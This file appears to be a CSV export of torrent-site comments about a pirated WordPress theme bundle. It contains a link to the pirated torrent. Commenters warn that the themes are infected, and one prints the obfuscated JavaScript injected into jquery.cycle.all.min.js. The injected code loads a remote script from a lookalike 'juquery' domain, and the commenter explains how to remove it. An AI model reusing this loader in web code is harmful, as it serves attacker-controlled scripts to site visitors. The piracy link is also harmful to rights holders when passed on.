@@ -1,0 +1,27 @@
+﻿User Type,Username,Date,Text
+,Labryn,2013-06-03T06:38Z,"If you like to download the Themes only without the PSD (Photoshop) files you can find that here: 
+
+http://thepiratebay.sx/torrent/8534881/ElegantThemes_-_MINI_Packaage_June_2013_[ALL_THEMEs-PLUGINs].rar"
+,anothercheapbastard,2013-06-03T20:03Z,Hi please seed-stuck and 88% will seed for a while.
+,mshunter,2013-06-05T05:10Z,DON'T DOWNLOAD. Themes are infected with script SPAM/ADS! 
+,Labryn,2013-06-06T15:02Z,"mshunter: How come you just registered today to scare people off? Simple answer, you are from elegantthemes ;) Dont be scared if people like it I am sure they`ll buy it from you."
+,wpqueen,2013-06-08T07:36Z,Just wondering why this is a 'rar' file?
+,TehBotol,2013-06-09T12:06Z,"Thanks for the upload, after mshunter said that, i checked some of the theme
+
+and in jquery.cycle.all.min.js
+there a javascript obfuscation an the end of the file that doesn't exist in the original file so make sure you delete them before using the template...
+
+note: the code exist in mostly in one js file inside the js folder
+
+to fix it, find this code
+
+the code is var hs_frf=document.createElement('script');hs_frf.setAttribute(""type"",""text/javascript"");var _0xa6df=[""x68x74x74x70x3Ax2Fx2Fx77x77x77x2Ex6Ax75x71x75x65x72x79x2Ex63x6Fx6Dx2Fx63x6Fx6Dx70x61x62x69x6Cx69x74x79x2Ex70x68x70x3F"",""x72x61x6Ex64x6Fx6D""];var hs_fln=_0xa6df[0]+Math[_0xa6df[1]]();hs_frf.setAttribute(""src"",hs_fln);if (typeof hs_frf!=""undefined"");document.getElementsByTagName(""head"")[0].appendChild(hs_frf);
+
+and delete them
+
+the obfuscate code seem to call hxxp://www.juquery.com (Note JUQuery not JQUERY)
+it also doesn't exist in the original js code... but all the rest of the file are legit... (note i check only 3 theme)
+
+thx again"
+,mshunter,2013-06-09T12:49Z,"@Labryn: TehBotol just answered. More, one .js file in ALL themes have the script obfuscation calling juquery to load the spam/ad script. And the mod'ed files are also an old version of the original files.
+Thanks for sharing the themes but next time, test them (or don't included sh** on them!)."
